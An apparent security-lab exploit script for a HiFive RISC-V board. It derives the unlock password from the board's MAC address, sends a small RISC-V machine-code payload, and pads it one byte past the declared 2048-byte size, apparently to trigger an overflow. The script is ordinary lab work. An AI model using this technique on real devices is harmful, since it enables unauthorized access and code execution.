import time
import pylink
import serial
import serial.tools.list_ports
import os


BOARD_PORT = ['/dev/ttyACM0', '/dev/ttyACM1']
hifive_serial_no = ''
hifive_ports = []
custom_game = b'\x13\x05\x10\x00\x93\x05\x00\x00\x13\x06\x00\x00s\x00\x00\x00'


# CONTENTS OF THE GAME

#         addi    a0, x0, 1      
#         la      a1, 0          
#         addi    a2, x0, 0    
#         ecall                
        


print('Waiting for board \n')
while(len(hifive_ports) <= 1):
    time.sleep(1)
    ports = serial.tools.list_ports.comports()
    
    for port in sorted(ports):
        if port.device in BOARD_PORT:
            hifive_serial_no = port.serial_number
            hifive_ports.append(port.device)      

print('Detected board at ports:',hifive_ports, '\nSERIAL_NO:  ', hifive_serial_no) 

os.system('echo "Reset" | JLinkExe -device RISC-V -if JTAG -speed 4000 -jtagconf -1-1 -autoconnect 1')

try:
    hifive_port_0 = serial.Serial(port= hifive_ports[0], baudrate= 115200, timeout = 0.1) 
    hifive_port_1= serial.Serial(port= hifive_ports[1], baudrate= 115200, timeout = 0.1)
except:
    print('No board connected')


hifive_port_1.dtr = 0
time.sleep(0.1)
hifive_port_1.rts = 0
time.sleep(0.1)


line = ''
while 'sta_mac' not in line:
    time.sleep(0.1)
    line = hifive_port_1.readline().decode('utf-8')

words = line.split(' ')

mac_addr = words.pop()
mac_addr = mac_addr[:17]
password= f'__SecLab__{mac_addr}'
print("PASSWORD:", password, '\n')

print(hifive_port_0.read_until('SecLab'))

hifive_port_0.write(bytes(password, 'utf-8'))
print(hifive_port_0.read_until('SecLab'))

time.sleep(0.5)

hifive_port_0.write(bytes('l', 'utf-8'))
print(hifive_port_0.read_until('SecLab'))

time.sleep(0.5)


game_size = 2048
hifive_port_0.write(game_size.to_bytes(4, byteorder='big'))
print(hifive_port_0.read_until('SecLab'))

print('\nCUSTOM GAME:     [', custom_game, "]")

for i in range(2049 - len(custom_game)):
    custom_game = custom_game + b'\1'
print('CUSTOM_GAME + PADDING LENGTH       ', len(custom_game),'\n')

hifive_port_0.write(custom_game)
print(hifive_port_0.read_until('SecLab'))
# EPILOGUE
hifive_port_0.close()
hifive_port_1.close()


